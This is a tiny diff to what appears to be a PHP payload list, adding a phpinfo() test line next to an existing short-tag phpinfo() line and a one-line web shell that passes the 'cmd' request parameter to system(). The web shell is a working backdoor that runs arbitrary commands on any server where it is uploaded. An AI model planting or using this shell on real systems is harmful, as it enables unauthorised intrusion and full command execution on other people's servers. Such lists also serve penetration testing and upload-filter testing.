@@ -1,2 +1,3 @@
 <?=phpinfo(); ?>    #for testing
+<?php phpinfo(); ?>
 <? system($_REQUEST['cmd']); ?>    #Run comaands using cmd
